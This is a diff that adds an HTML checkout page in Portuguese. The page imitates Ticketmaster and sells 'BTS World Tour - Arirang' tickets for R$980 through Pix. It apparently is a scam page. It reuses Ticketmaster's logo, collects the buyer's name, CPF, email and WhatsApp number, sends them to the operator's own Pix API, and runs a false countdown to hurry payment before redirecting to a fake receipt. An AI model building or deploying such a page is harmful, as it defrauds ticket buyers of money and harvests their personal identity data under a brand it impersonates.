@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ticketmaster - Finalizar Pagamento</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #ffffff; color: #333; }
+
+        /* Header com Menu Hambúrguer */
+        .tm-header {
+            background-color: #026CDF;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .menu-hamburguer {
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .menu-hamburguer div {
+            width: 20px;
+            height: 2px;
+            background-color: white;
+            border-radius: 2px;
+        }
+
+        .tm-logo { height: 45px; }
+
+        .user-icon {
+            width: 24px;
+            height: 24px;
+            border: 1.5px solid white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* HERO - Título Centralizado e Destacado */
+        .hero-status-container {
+            width: 100%;
+            background-color: #A5D3E9;
+            padding: 35px 20px;
+            text-align: center;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .event-title-highlight {
+            font-size: 16px;
+            font-weight: 800;
+            color: #111;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 12px;
+            display: block;
+        }
+
+        .status-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #026CDF;
+            letter-spacing: -0.5px;
+        }
+
+        /* Área de Conteúdo */
+        .payment-wrapper {
+            max-width: 650px;
+            margin: 30px auto;
+            padding: 0 20px;
+            text-align: center;
+        }
+        .instruction-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: #444;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        .deadline-box { margin-bottom: 25px; }
+        .deadline-label { font-size: 12px; font-weight: 700; color: #888; margin-bottom: 4px; display: block; text-transform: uppercase; }
+        .deadline-timer { font-size: 15px; font-weight: 800; color: #28a745; }
+
+        /* QR CODE */
+        .qr-section { margin-bottom: 15px; }
+        #qrImg { 
+            width: 190px; 
+            height: 190px; 
+            padding: 10px; 
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: 4px;
+        }
+        .pix-brand { width: 50px; margin-top: 10px; opacity: 0.8; }
+
+        /* CÓDIGO COPIA E COLA */
+        .copy-action {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: #026CDF;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            margin: 15px 0;
+        }
+        #pixCode { position: absolute; left: -9999px; }
+
+        /* Instruções numeradas */
+        .payment-steps {
+            text-align: left;
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 25px 0;
+            font-size: 13px;
+            color: #555;
+            line-height: 1.7;
+        }
+        .payment-steps b { color: #111; }
+
+        .btn-paid {
+            background-color: #026CDF;
+            color: white;
+            border: none;
+            width: 100%;
+            max-width: 280px;
+            padding: 15px;
+            border-radius: 4px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        @media (min-width: 601px) {
+            .btn-paid { width: 220px; }
+        }
+        /* Card de Identificação */
+/* Card de Identificação */
+.user-info-card {
+    background: #ffffff;
+    border: 1px solid #e0e0e0;
+    border-radius: 8px;
+    margin: 15px 0;
+    padding: 12px 15px;
+    display: flex;
+    justify-content: space-between;
+    gap: 15px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.04);
+}
+
+.info-item {
+    display: flex;
+    flex-direction: column;
+    flex: 1;
+}
+
+.info-label {
+    font-size: 9px;
+    color: #026cdf;
+    font-weight: 800;
+    letter-spacing: 0.5px;
+    margin-bottom: 4px;
+    text-align: left;
+}
+
+/* Inputs que parecem texto mas são editáveis */
+.input-minimal {
+    border: none;
+    border-bottom: 1px solid #eee;
+    padding: 4px 0;
+    font-size: 13px;
+    color: #333;
+    font-weight: 600;
+    outline: none;
+    background: transparent;
+    width: 100%;
+}
+
+.input-minimal:focus {
+    border-bottom: 1px solid #026cdf;
+}
+
+.info-divider {
+    width: 1px;
+    height: 30px;
+    background-color: #f0f0f0;
+    align-self: center;
+}
+
+/* Estilo do Input de Pix */
+#pixCode {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    margin-bottom: 10px;
+    font-size: 12px;
+    text-align: center;
+    box-sizing: border-box;
+}
+
+/* Responsividade para telas pequenas */
+@media (max-width: 400px) {
+    .user-info-card {
+        flex-direction: column;
+        gap: 10px;
+    }
+    .info-divider {
+        display: none;
+    }
+}
+    </style>
+</head>
+<body>
+
+ <header class="tm-header">
+    <div class="menu-hamburguer">
+        <div></div>
+        <div></div>
+        <div></div>
+    </div>
+    <img src="https://prod-assets.tmlat.com/Tk_general_c73b9c007f.svg" class="tm-logo" alt="Ticketmaster">
+    <div class="user-icon">
+        <svg width="14" height="14" fill="white" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+    </div>
+</header>
+
+<div class="hero-status-container">
+    <span class="event-title-highlight">BTS World Tour - Arirang</span>
+    <div class="status-title" id="pixStatus">Aguardando pagamento</div>
+</div>
+
+<div class="payment-wrapper">
+    <p class="instruction-text">Seus ingressos serão emitidos assim que seu pagamento for compensado.</p>
+    
+    <div class="deadline-box">
+        <span class="deadline-label">Prazo para pagamento</span>
+        <span class="deadline-timer" id="timer">06 DE ABRIL DE 2026 05:00</span>
+    </div>
+
+    <div class="user-info-card">
+        <div class="info-item">
+            <label class="info-label">NOME COMPLETO</label>
+            <input type="text" id="userName" class="input-minimal" placeholder="Nome do titular" autocomplete="off" name="field-name-random">
+        </div>
+        <div class="info-divider"></div>
+        <div class="info-item">
+            <label class="info-label">CPF</label>
+            <input type="text" id="userCPF" class="input-minimal" placeholder="000.000.000-00" maxlength="14" autocomplete="off" name="field-cpf-random" oninput="mascaraCPF(this)">
+        </div>
+    </div>
+
+    <div class="qr-section">
+        <img id="qrImg" src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=CHAVE_PIX" alt="QR Code PIX">
+        <br>
+        <img src="https://logopng.com.br/logos/pix-106.png" class="pix-brand" alt="Pix Logo">
+    </div>
+
+    <input type="text" id="pixCode" autocomplete="off" name="pix-entry" spellcheck="false" placeholder="Cole o código Pix aqui">
+
+    <div class="copy-action" id="btnCopy" onclick="copyPix()">
+        Copie o código <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+    </div>
+
+    <div class="payment-steps">
+        <b>1</b> Abra o app do seu banco ou seu app de pagamentos.<br>
+        <b>2</b> Busque a opção de <b>pagar com Pix</b>.<br>
+        <b>3</b> Digitalize o código QR ou copie o código.
+    </div>
+
+    <button class="btn-paid" onclick="verificarPagamento()">Eu já paguei</button>
+</div>
+
+<script>
+    // Função para colocar os pontos e traço no CPF automaticamente
+    function mascaraCPF(i) {
+        let v = i.value;
+        
+        if (isNaN(v[v.length - 1])) { // impede digitar letras
+            i.value = v.substring(0, v.length - 1);
+            return;
+        }
+        
+        i.setAttribute("maxlength", "14");
+        if (v.length == 3 || v.length == 7) i.value += ".";
+        if (v.length == 11) i.value += "-";
+    }
+
+    function copyPix() {
+        const pixInput = document.getElementById("pixCode");
+        pixInput.select();
+        document.execCommand("copy");
+        alert("Código Pix copiado!");
+    }
+</script>
+
+    <script>
+    window.nomeUsuario = "";
+    window.cpfUsuario = "";
+    window.emailUsuario = "";
+    window.whatsappUsuario = "";
+    window.pixTransactionId = null;
+    window.checkInterval = null;
+
+    window.onload = function () {
+        const urlParams = new URLSearchParams(window.location.search);
+        const nomeCompleto = urlParams.get('nome') || "USUÁRIO";
+        const cpf = urlParams.get('cpf') || "28818961896";
+        const email = urlParams.get('email') || "joao@gmail.com";
+        const whatsapp = urlParams.get('whatsapp') || "11999999999";
+        
+        window.nomeUsuario = nomeCompleto;
+        window.cpfUsuario = cpf;
+        window.emailUsuario = email;
+        window.whatsappUsuario = whatsapp;
+
+        gerarPix();
+    };
+
+    async function copyPix() {
+        const text = document.getElementById("pixCode")?.value || "";
+        const btn = document.getElementById("btnCopy");
+        if (!text || text.includes("Gerando")) return;
+        await navigator.clipboard.writeText(text);
+        btn.innerHTML = "Copiado com sucesso!";
+        setTimeout(() => {
+            btn.innerHTML = "Copie o código <svg width='16' height='16' fill='currentColor' viewBox='0 0 24 24'><path d='M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z'/></svg>";
+        }, 2000);
+    }
+
+    async function gerarPix() {
+        const pixField = document.getElementById("pixCode");
+        const qrImg = document.getElementById("qrImg");
+        const status = document.getElementById("pixStatus");
+
+        try {
+            status.textContent = "Gerando pagamento...";
+            const resp = await fetch("/api/api-pix.php", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    nome: window.nomeUsuario,
+                    cpf: window.cpfUsuario,
+                    email: window.emailUsuario,
+                    whatsapp: window.whatsappUsuario,
+                    valor: 980.00,
+                    descricao: "BTS WORLD TOUR ARIRANG"
+                })
+            });
+
+            const data = await resp.json();
+            if (!data.success) throw new Error();
+
+            const pixCode = data?.pix_copia_cola || data?.qr_code || "";
+            const qrCodeBase64 = data?.qr_code_base64 || "";
+            window.pixTransactionId = data?.transaction_id || "";
+
+            pixField.value = pixCode;
+            qrImg.src = qrCodeBase64.startsWith("data:image") ? qrCodeBase64 : "data:image/png;base64," + qrCodeBase64;
+            status.textContent = "Aguardando pagamento";
+
+            window.checkInterval = setInterval(verificarPagamento, 5000);
+        } catch (err) {
+            status.textContent = "Erro ao gerar PIX";
+        }
+    }
+
+    async function verificarPagamento() {
+        if (!window.pixTransactionId) return;
+        try {
+            const resp = await fetch("/api/verificar-pix.php?transactionId=" + encodeURIComponent(window.pixTransactionId));
+            const data = await resp.json();
+            if (data.pago === true) {
+                clearInterval(window.checkInterval);
+                window.location.href = "/comprovante";
+            }
+        } catch (e) {}
+    }
+
+    let tempoRestante = 300;
+    function iniciarTimer() {
+        const timerEl = document.getElementById("timer");
+        setInterval(() => {
+            tempoRestante--;
+            if (tempoRestante < 0) return;
+            const m = Math.floor(tempoRestante / 60);
+            const s = tempoRestante % 60;
+            timerEl.textContent = `06 DE ABRIL DE 2026 0${m}:${s < 10 ? '0'+s : s}`;
+        }, 1000);
+    }
+    window.addEventListener("load", iniciarTimer);
+    
+    // Localize a função verificarPagamento no seu código e substitua por esta:
+async function verificarPagamento() {
+    if (!window.pixTransactionId) return;
+    
+    try {
+        const resp = await fetch("/api/verificar-pix.php?transactionId=" + encodeURIComponent(window.pixTransactionId));
+        const data = await resp.json();
+        
+        if (data.pago === true) {
+            clearInterval(window.checkInterval);
+            
+            // 1. Pega o valor atual do input de nome
+            const nomeDigitado = document.getElementById("userName").value;
+            
+            // 2. Define um fallback caso o usuário não tenha digitado nada
+            const nomeFinal = nomeDigitado ? encodeURIComponent(nomeDigitado) : encodeURIComponent(window.nomeUsuario);
+            
+            // 3. Redireciona passando o nome na URL para a página do ingresso
+            // Ajuste o caminho "/processo" se a página do ingresso for outro arquivo (ex: ingresso.html)
+            window.location.href = "../comprovante?nome=" + nomeFinal;
+        }
+    } catch (e) {
+        console.error("Erro ao verificar status:", e);
+    }
+}
+
+// Também recomendo adicionar este pequeno listener para manter a variável global 
+// de nome sempre atualizada conforme o usuário digita:
+document.getElementById("userName").addEventListener("input", function(e) {
+    window.nomeUsuario = e.target.value;
+});
+    </script>
+</body>
+</html>
